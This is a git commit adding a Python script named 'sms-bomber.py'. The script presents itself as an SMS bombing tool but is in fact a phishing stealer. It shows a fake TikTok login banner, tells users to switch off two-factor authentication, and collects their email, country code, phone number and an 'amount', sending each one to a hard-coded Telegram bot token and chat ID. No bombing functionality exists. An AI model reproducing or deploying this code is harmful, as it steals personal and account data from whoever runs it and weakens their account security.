209652e0c70ef53d1ffabded415643efa85fd1b2
Crazy 10100 <115801330+Crazy10100@users.noreply.github.com>
2023-04-05 20:02:38 +0600

    New-sms
    I

---
+++ sms-bomber.py
@@ -0,0 +1,90 @@
+print ("""
+
+  /$$$$$$                                /$$                               /$$                          
+ /$$__  $$                              | $$                              | $$                          
+| $$  \__/ /$$$$$$/$$$$   /$$$$$$$      | $$$$$$$   /$$$$$$  /$$$$$$/$$$$ | $$$$$$$   /$$$$$$   /$$$$$$ 
+|  $$$$$$ | $$_  $$_  $$ /$$_____/      | $$__  $$ /$$__  $$| $$_  $$_  $$| $$__  $$ /$$__  $$ /$$__  $$
+ \____  $$| $$ \ $$ \ $$|  $$$$$$       | $$  \ $$| $$  \ $$| $$ \ $$ \ $$| $$  \ $$| $$$$$$$$| $$  \__/
+ /$$  \ $$| $$ | $$ | $$ \____  $$      | $$  | $$| $$  | $$| $$ | $$ | $$| $$  | $$| $$_____/| $$      
+|  $$$$$$/| $$ | $$ | $$ /$$$$$$$/      | $$$$$$$/|  $$$$$$/| $$ | $$ | $$| $$$$$$$/|  $$$$$$$| $$      
+ \______/ |__/ |__/ |__/|_______/       |_______/  \______/ |__/ |__/ |__/|_______/  \_______/|__/      
+                                                                                                        
+                                                                                                        
+                                                                                                        
+""""")
+print ("welcom to Sms Bomber ")
+
+print ("Enter the [Y ]")
+
+number=str(input("  : "))
+
+import webbrowser
+webbrowser.open('https://vt.tia/', new=2)
+
+number=str(input("Your name   : "))
+
+print ("""""
+
+██████████████████████████████████████████████████████████████████████████████████████████████
+█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
+█▒▒▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█
+█▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▄▀▒▒█████████▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒█████████
+█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█
+█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+█▒▒▄▀▒▒██▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█
+█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▒▒████▒▒▄▀▒▒█████████▒▒▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█████████▒▒▄▀▒▒█
+█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█
+█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
+██████████████████████████████████████████████████████████████████████████████████████████████""""")
+
+print ("          ")
+
+print ("              Login Your TikTok Account")
+print ("              Please Off Your  two-factor authentication Code ")
+
+print ("             ")
+
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(" Enter Your Email : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+# You Can Change The Key's Name. But don't Change The Values.
+
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(" ENTER YOUR COUNTRY CODE : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+# You Can Change The Key's Name. But don't Change The Values.
+
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(" ENTER YOUR NAMBER : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+# You Can Change The Key's Name. But don't Change The Values.
+
+
+
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(" Enter the Amount : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+# You Can Change The Key's Name. But don't Change The Values.
+
+print ("       ")
+print ("       ")
+print ("                 Please wait 24 hour")
+	
